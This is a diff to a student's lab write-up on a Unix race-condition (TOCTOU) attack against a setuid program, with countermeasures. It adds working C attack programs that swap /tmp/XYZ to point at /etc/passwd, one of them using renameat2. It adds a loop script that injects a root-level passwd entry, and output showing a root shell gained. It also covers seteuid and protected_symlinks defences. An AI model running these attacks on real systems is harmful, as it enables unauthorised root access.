@@ -197,11 +197,32 @@ test:U6aMy0wojraho:0:0:test:/root:/bin/bash[November 29 2021] seed@xingjian:~/Do
 
 ### Task 2.B: The Real Attack
 
-In the previous task, we have kind of "cheated" by asking the vulnerable program to slow down, so we can launch the attack. Before launching this real attack, make sure that the `sleep()` statement is removed from the `vulp` program.
+Before launching this real attack, make sure that the `sleep()` statement is removed from the `vulp` program.
+
+In the simulated attack, we used the `ln -s` command to make/change symbolic links. Now we need to do it in a program:
+
+```c
+/* The attack program */
+#include <unistd.h>
+
+int main()
+{
+    char* fn = "/tmp/XYZ";
+    char* pw = "/etc/passwd";
+
+    while (1) {
+        unlink(fn);
+        symlink(pw, fn);
+        usleep(100);
+    }
+
+    return 0;
+}
+```
 
 The typical strategy in race condition attacks is to run the attack program in parallel to the target program, hoping to be able to do the critical step within that time window. Since the success of attack is only probabilistic, we have to run the attack many times to hit the race condition window once if the window is small. We will write a program to automate this process.
 
-The following shell script runs the `ls -l` command at the very beginning, which outputs several pieces of information about a file, including the last modified time. By comparing the outputs of the command with the ones produced previously, we can tell whether the file has been modified or not. Then the shell script runs the `vulp` program in a loop, with the input given by the `echo` command (via a pipe). If the attack is successful, i.e., the password file is modified, the shell script will stop.
+The following shell script `target_process.sh` runs the `ls -l` command at the very beginning, which outputs several pieces of information about a file, including the last modified time. By comparing the outputs of the command with the ones produced previously, we can tell whether the file has been modified or not. Then the shell script runs the `vulp` program in a loop, with the input given by the `echo` command (via a pipe). If the attack is successful, i.e., the password file is modified, the shell script will stop.
 
 ```bash
 #!/bin/bash
@@ -209,20 +230,169 @@ The following shell script runs the `ls -l` command at the very beginning, which
 CHECK_FILE="ls -l /etc/passwd"
 old=$($CHECK_FILE)
 new=$($CHECK_FILE)
-while [ "$old" == "$new" ]          # repeatedly check if /etc/passwd is modified
+while [ "$old" == "$new" ]  # repeatedly check if /etc/passwd is modified
 do
-    echo "<input string>" | ./vulp  # run the vulnerable program
+    echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vulp # run the vulnerable program
     new=$($CHECK_FILE)
 done
 echo "STOP... The password file has been changed!"
 ```
 
+Again:
+
+```bash
+$ touch /tmp/XYZ
+$ stat /tmp/XYZ
+  File: /tmp/XYZ
+  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
+Device: 10301h/66305d	Inode: 2268        Links: 1
+Access: (0664/-rw-rw-r--)  Uid: ( 1001/    seed)   Gid: ( 1001/    seed)
+Access: 2021-11-29 17:04:38.704184361 -0500
+Modify: 2021-11-29 17:04:38.704184361 -0500
+Change: 2021-11-29 17:04:38.704184361 -0500
+ Birth: -
+$ ./target_process.sh
+```
+
+Then in a separate terminal window:
+
+```bash
+$ gcc attack.c -o attack
+$ ./attack
+```
+
+Unfortunately, after ten minutes, the shell script was still running.
+
+```bash
+[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ stat /tmp/XYZ
+  File: /tmp/XYZ -> /etc/passwd
+  Size: 11        	Blocks: 0          IO Block: 4096   symbolic link
+Device: 10301h/66305d	Inode: 2268        Links: 1
+Access: (0777/lrwxrwxrwx)  Uid: ( 1001/    seed)   Gid: ( 1001/    seed)
+Access: 2021-11-29 17:23:32.436070811 -0500
+Modify: 2021-11-29 17:23:32.432070801 -0500
+Change: 2021-11-29 17:23:32.432070801 -0500
+ Birth: -
+```
+
 ### Task 2.C: An Improved Attack Method
+
+The following program first makes two symbolic links `/tmp/XYZ` and `/tmp/ABC`, and then using the `renameat2` system call to atomically switch them. This method will introduce no race condition.
+
+```c
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main()
+{
+    char* fn1 = "/tmp/XYZ";
+    char* fn2 = "/tmp/ABC";
+    char* ln1 = "/dev/null";
+    char* ln2 = "/etc/passwd";
+    unsigned int flags = RENAME_EXCHANGE;
+
+    while (1) {
+        unlink(fn1);
+        symlink(ln1, fn1);
+        usleep(100);
+
+        unlink(fn2);
+        symlink(ln2, fn2);
+        usleep(100);
+
+        renameat2(0, fn1, 0, fn2, flags);
+    }
+
+    return 0;
+}
+```
+
+The attack succeeded:
+
+```bash
+[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ ./target_process.sh
+No permission 
+No permission 
+No permission 
+No permission 
+No permission 
+No permission 
+STOP... The passwd file has been changed
+[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ su test
+Password: 
+[November 29 2021] root@ip-172-31-1-54:/home/seed/Documents/RaceCondition#
+```
 
 ## Task 3: Countermeasures
 
 ### Task 3.A: Applying the Principle of Least Privilege
 
-## Notes
+The fundamental problem of the vulnerable program in this lab is the violation of the *Principle of Least Privilege*; namely, if users do not need certain privilege, the privilege needs to be disabled. We can use `seteuid` system call to temporarily disable the root privilege, and later enable it if necessary.
 
-[^1]: 
+To test the idea, I used the following code:
+
+```c
+/* The vulp_fixed.c program */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int main()
+{
+    char* fn = "/tmp/XYZ";
+    char buffer[60];
+    FILE* fp;
+
+    uid_t real_uid = getuid(); // real user ID
+    uid_t eff_uid = geteuid(); // effective user ID
+
+    /* get user input */
+    scanf("%50s", buffer);
+
+    /* Set effective user ID to real user ID */
+    if (seteuid(real_uid) != 0) {
+        perror("Set effective user ID failed");
+        exit(1);
+    }
+
+    if (!access(fn, W_OK)) {
+        sleep(10);
+        fp = fopen(fn, "a+");
+        if (!fp) {
+            perror("Open failed");
+            exit(1);
+        }
+        fwrite("\n", sizeof(char), 1, fp);
+        fwrite(buffer, sizeof(char), strlen(buffer), fp);
+        fclose(fp);
+    } else {
+        printf("No permission \n");
+        /* Restore the effective user ID */
+        seteuid(eff_uid);
+    }
+
+    return 0;
+}
+
+```
+
+When the effective user ID is modified to the real user ID of the calling process (`vulp`), a mismatch is created between the user ID of the symlink's owner and the calling process's real user ID. Access to the temporary file is denied:
+
+```bash
+[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ touch /tmp/XYZ
+[November 29 2021] seed@xingjian:~/Documents/RaceCondition$ ./vulp
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+Open failed: Permission denied
+```
+
+### Task 3.B: Using Ubuntu's Built-in Scheme
+
+Ubuntu 10.10 and later versions come with a built-in protection scheme against race condition attacks. Turn the protection back on using the following commands:
+```bash
+$ sudo sysctl -w fs.protected_symlinks=1
+```
+
+I repeated the procedure in Task 2.C, the attack could not work, just as expected. This protection scheme ensures that if a symlink is placed in a world-writable directory that has the sticky bit set so that only the owner of a file can delete it, only the owner of the symlink can dereference it. Everyone else will get `EACCES` on any operation that attempts to do so, including things like attempting to `stat()` the symlink. Here is a [blog post](https://utcc.utoronto.ca/~cks/space/blog/linux/Ubuntu1204Symlinks) by Chris Siebenmann on this issue. The approach only concerns sticky world-writable directories and it does not provide any protection at the kernel level (e.g., [CVE-2018-6954](https://security.alpinelinux.org/vuln/CVE-2018-6954)). We are not supposed to settle for this.
